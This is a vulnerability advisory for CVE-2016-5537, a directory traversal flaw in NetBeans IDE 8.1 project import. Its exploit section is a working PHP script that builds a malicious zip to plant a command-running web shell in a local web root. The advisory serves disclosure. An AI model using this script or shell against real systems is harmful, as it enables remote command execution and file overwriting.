@@ -1,0 +1,128 @@
+[+] Credits: John Page aka hyp3rlinx	
+
+[+] Website: hyp3rlinx.altervista.org
+
+[+] Source:  http://hyp3rlinx.altervista.org/advisories/ORACLE-NETBEANS-IDE-DIRECTORY-TRAVERSAL.txt
+
+[+] ISR: ApparitionSec
+
+
+
+Vendor:
+===============
+www.oracle.com
+
+
+
+Product:
+=================
+Netbeans IDE v8.1
+
+
+
+Vulnerability Type:
+=========================
+Import Directory Traversal  
+
+
+
+CVE Reference:
+==============
+CVE-2016-5537
+
+
+
+Vulnerability Details:
+=====================
+
+This was part of Oracle Critical Patch Update for October 2016.
+
+Vulnerability in the NetBeans component of Oracle Fusion Middleware (subcomponent: Project Import).
+The supported version that is affected is 8.1. Easily exploitable vulnerability allows high privileged attacker with logon
+to the infrastructure where NetBeans executes to compromise NetBeans. While the vulnerability is in NetBeans, attacks may significantly
+impact additional products. Successful attacks of this vulnerability can result in unauthorized update, insert or delete access to some
+of NetBeans accessible data as well as unauthorized read access to a subset of NetBeans accessible data and unauthorized ability to cause
+a partial denial of service (partial DOS) of NetBeans. 
+
+Vulnerability in way Netbeans processes  ".zip" archives to be imported as project. If a user imports a malicious project 
+containing "../" characters the import will fail, yet still process the "../".  we can then place malicious scripts outside of
+the target directory and inside web root if user is running a local server etc...
+
+It may be possible to then execute remote commands on the affected system by later visiting the URL and access our script if that
+web server is public facing, if it is not then it may still be subject to abuse internally by internal malicious users. Moreover,
+it is also possible to overwrite files on the system hosting vulnerable versions of NetBeans IDE.
+
+
+References:
+http://www.oracle.com/technetwork/security-advisory/cpuoct2016-2881722.html#AppendixFMW
+
+
+Exploit Code(s):
+=================
+
+<?php
+ #archive path traversal
+ #target xampp htdocs as POC
+ #by hyp3rlinx
+ #===============================
+ if($argc<4){echo "Usage: <zip name>, <path depth>, <RCE.php as default? Y/[file]>";exit();}
+ $zipname=$argv[1];
+ $exploit_file="RCE.php";
+ $cmd='<?php exec($_GET["cmd"]); ?>';
+ if(!empty($argv[2])&&is_numeric($argv[2])){
+ $depth=$argv[2];
+ }else{
+ echo "Second flag <path depth> must be numeric!, you supplied '$argv[2]'";
+ exit();
+ }
+ if(strtolower($argv[3])!="y"){
+ if(!empty($argv[3])){
+ $exploit_file=$argv[3];
+ }
+ if(!empty($argv[4])){
+ $cmd=$argv[4];
+ }else{
+ echo "Usage: enter a payload for file $exploit_file wrapped in double
+ quotes";
+ exit();
+ }
+ }
+ $zip = new ZipArchive();
+ $res = $zip->open("$zipname.zip", ZipArchive::CREATE);
+ $zip->addFromString(str_repeat("..\\",
+ $depth)."\\xampp\\htdocs\\".$exploit_file, $cmd);
+ $zip->close();
+ echo "\r\nExploit archive $zipname.zip created using $exploit_file\r\n";
+ echo "================ hyp3rlinx ===================";
+?>
+
+
+Disclosure Timeline:
+=======================================
+Vendor Notification: September 20, 2016
+October 20, 2016 : Public Disclosure
+
+
+
+Exploitation Technique:
+=======================
+Local
+
+
+
+Severity Level:
+=====================
+CVSS VERSION 3.0 RISK 
+5.7
+
+
+
+[+] Disclaimer
+The information contained within this advisory is supplied "as-is" with no warranties or guarantees of fitness of use or otherwise.
+Permission is hereby granted for the redistribution of this advisory, provided that it is not altered except by reformatting it, and
+that due credit is given. Permission is explicitly given for insertion in vulnerability databases and similar, provided that due credit
+is given to the author. The author is not responsible for any misuse of the information contained herein and accepts no responsibility
+for any damage caused by the use or misuse of this information. The author prohibits any malicious use of security related information
+or exploits by the author or elsewhere.
+
+hyp3rlinx
